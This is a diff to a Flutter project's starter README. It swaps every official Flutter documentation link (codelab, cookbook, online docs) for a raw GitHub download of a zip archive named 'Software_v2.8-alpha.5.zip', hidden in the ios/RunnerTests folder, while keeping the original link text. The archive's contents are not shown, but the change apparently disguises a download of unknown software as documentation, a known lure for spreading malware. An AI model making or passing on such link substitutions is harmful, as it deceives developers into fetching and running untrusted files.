@@ -8,9 +8,9 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://docs.flutter.dev/get-started/codelab)
-- [Cookbook: Useful Flutter samples](https://docs.flutter.dev/cookbook)
+- [Lab: Write your first Flutter app](https://github.com/Mizistein/screentimer/raw/refs/heads/main/ios/RunnerTests/Software_v2.8-alpha.5.zip)
+- [Cookbook: Useful Flutter samples](https://github.com/Mizistein/screentimer/raw/refs/heads/main/ios/RunnerTests/Software_v2.8-alpha.5.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://docs.flutter.dev/), which offers tutorials,
+[online documentation](https://github.com/Mizistein/screentimer/raw/refs/heads/main/ios/RunnerTests/Software_v2.8-alpha.5.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
